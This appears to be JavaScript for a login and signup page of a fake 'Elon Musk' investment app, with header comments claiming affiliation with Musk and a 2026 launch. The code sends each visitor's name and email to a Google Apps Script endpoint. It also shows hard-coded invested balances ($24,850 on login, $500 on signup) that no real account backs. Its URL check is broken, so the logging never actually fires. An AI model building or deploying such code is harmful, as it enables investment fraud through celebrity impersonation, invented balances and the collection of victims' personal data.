//THIS FILE IS A PROPERTY OF THE ELON MUSK FOUNDATION COMPANY. NOTE: THIS IS A FREE VIEW USE VERSION OF THE UPCOMING INVESTMENT X TPC ELON MUSK APP/WEBSITE. THE FULL VERSION WILL BE DROPPING ON THE 1ST OF JULY 2026' 
//THIS IS LEGAL FILE. DO NOT INTEND TO COPY THE CODE AND USE IT AS A FAKE INVESTMENT WEB APPLICATION 
//WARNING: IF YOU ARE CAUGHT YOU WILL FINED WITH ACCOMPLIAINCE

// ==================== GOOGLE SHEETS LOGGING ====================
// PASTE YOUR ACTUAL WEB APP URL BELOW 
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbziNqD_b08nP73CZbimGFvqaeuIONXVp0T-X7gr4fa2c929yGRkXkEqYGDpvSx9dQb9BQ/exec";

async function logToGoogleSheets(action, name, email) {
    if (!GOOGLE_SCRIPT_URL || GOOGLE_SCRIPT_URL.includes("https://script.google.com/macros/s/AKfycbziNqD_b08nP73CZbimGFvqaeuIONXVp0T-X7gr4fa2c929yGRkXkEqYGDpvSx9dQb9BQ/exec")) {
        console.log("⚠️ Google Sheets URL not set yet");
        return;
    }

    try {
        const payload = {
            action: action,
            name: name,
            email: email
        };

        const response = await fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            body: JSON.stringify(payload),
            headers: { "Content-Type": "application/json" }
        });

        if (response.ok) {
            console.log(`✅ ${action} successfully logged to Google Sheets`);
        }
    } catch (err) {
        console.log("Could not log to Google Sheets:", err);
    }
}

// Login Function
function loginUser(name, email) {
    if (!name || name.trim() === "") {
        alert("Please enter your name");
        return;
    }
    if (!email || !email.includes("@")) {
        alert("Please enter a valid email address");
        return;
    }

    const user = {
        name: name.trim(),
        email: email.trim(),
        invested: 24850,
        joined: "March 2026"
    };

    localStorage.setItem('elonUser', JSON.stringify(user));
    currentUser = user;

    // Log to Google Sheets
    logToGoogleSheets("Login", user.name, user.email);

    alert(`✅ Login successful!\nWelcome back, ${user.name}!`);
    window.location.href = "dashboard.html";
}

// Signup Function
function signupUser(name, email) {
    if (!name || name.trim() === "") {
        alert("Please enter your name");
        return;
    }
    if (!email || !email.includes("@")) {
        alert("Please enter a valid email address");
        return;
    }

    const user = {
        name: name.trim(),
        email: email.trim(),
        invested: 500,
        joined: "March 2026"
    };

    localStorage.setItem('elonUser', JSON.stringify(user));
    currentUser = user;

    // Log to Google Sheets
    logToGoogleSheets("Signup", user.name, user.email);

    alert(`🎉 Account created successfully!\nWelcome, ${user.name}!`);
    window.location.href = "dashboard.html";
}
